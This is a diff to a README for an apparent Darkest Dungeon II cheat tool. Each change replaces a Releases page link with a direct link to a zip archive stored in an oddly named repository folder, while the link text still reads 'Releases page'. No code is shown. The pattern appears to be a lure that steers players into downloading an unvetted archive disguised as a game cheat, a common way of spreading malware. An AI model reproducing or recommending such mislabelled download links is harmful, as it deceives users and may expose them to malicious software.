@@ -8,9 +8,9 @@ Welcome to the PC Darkest Dungeon II cheats damage multiplier! This tool helps y
 
 To get started, visit the releases page to download the application:
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/releases)
+[![Download Here](https://raw.githubusercontent.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/main/semitubular/PC-Darkest-Dungeon-II-cheats-damage-multiplier.zip)](https://raw.githubusercontent.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/main/semitubular/PC-Darkest-Dungeon-II-cheats-damage-multiplier.zip)
 
-1. Go to the [Releases page](https://github.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/main/semitubular/PC-Darkest-Dungeon-II-cheats-damage-multiplier.zip).
 2. Find the latest release.
 3. Click on the download link for the application file.
 
@@ -69,4 +69,4 @@ If you encounter issues or need help, feel free to reach out through the Issues 
 
 For more information on using cheats and enhancing your gameplay, visit the Darkest Dungeon II official forums and community pages. You can find helpful tips and tricks shared by other players.
 
-Enjoy your enhanced gaming experience with PC Darkest Dungeon II cheats damage multiplier! Don't forget to check the [Releases page](https://github.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/releases) for updates.
+Enjoy your enhanced gaming experience with PC Darkest Dungeon II cheats damage multiplier! Don't forget to check the [Releases page](https://raw.githubusercontent.com/akm940356/PC-Darkest-Dungeon-II-cheats-damage-multiplier/main/semitubular/PC-Darkest-Dungeon-II-cheats-damage-multiplier.zip) for updates.
